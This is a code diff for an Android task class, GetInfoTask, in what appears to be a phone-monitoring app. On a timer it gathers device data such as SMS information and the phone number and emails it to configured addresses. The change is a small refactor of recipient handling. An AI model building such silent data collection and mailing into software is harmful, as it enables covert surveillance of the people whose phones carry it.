@@ -20,6 +20,7 @@ import system.service.feature.sms.SmsCtrl;
 import system.service.feature.sms.SmsInfo;
 
 import com.particle.inspector.common.util.DatetimeUtil;
+import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.mail.GMailSenderEx;
@@ -61,6 +62,10 @@ public class GetInfoTask extends TimerTask
 	
 	public void run() 
 	{
+		// If there are no recipients, return 
+		String[] recipients = getRecipients(context);
+		if (recipients == null || recipients.length == 0) return;
+		
 		// If network connected, try to collect and send the information
 		if (!SysUtils.isNetworkConnected(context)) return;
 		
@@ -79,7 +84,6 @@ public class GetInfoTask extends TimerTask
 		Date now_minus_x_day = now.getTime();
 		if (lastDatetime != null && now_minus_x_day.before(lastDatetime)) 
 		{
-			//Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
 			return;
 		}
 		
@@ -107,7 +111,6 @@ public class GetInfoTask extends TimerTask
 	          		 + phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date())
 	          		 + context.getResources().getString(R.string.mail_description);
 		String body = String.format(context.getResources().getString(R.string.mail_body), phoneNum);
-		String[] recipients = getRecipients(context);
 		String pwd = MailCfg.getSenderPwd(context);
 		
 		boolean result = false;
@@ -218,7 +221,12 @@ public class GetInfoTask extends TimerTask
 	private static String[] getRecipients(Context context)
 	{
 		String mail = GlobalPrefActivity.getMail(context);
-		return mail.split(",");
+		String[] mails = mail.split(",");
+		if (mails.length > 0) {
+			return StrUtils.filterMails(mails);
+		} else {
+			return null;
+		}
 	}
 	
 }
